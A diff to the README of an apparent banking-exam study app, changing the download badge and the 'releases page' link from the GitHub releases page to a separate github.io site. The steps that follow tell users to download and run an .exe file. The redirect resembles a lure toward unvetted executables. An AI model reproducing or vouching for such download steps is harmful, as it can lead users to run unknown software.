@@ -1,12 +1,12 @@
 # 🎓 bank-exam-study-hub-2026 - Master your banking exams with confidence
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/reccolimonene579/bank-exam-study-hub-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://reccolimonene579.github.io)
 
 Bank Exam Study Hub v2026 provides a complete preparation suite for banking and competitive examinations. This platform organizes study plans, delivers mock tests, provides essential learning materials, and tracks your progress. You use this software to focus your studies and identify areas for improvement.
 
 ## 📥 How to download the software
 
-1. Visit the [releases page](https://github.com/reccolimonene579/bank-exam-study-hub-2026/releases).
+1. Visit the [releases page](https://reccolimonene579.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your computer.
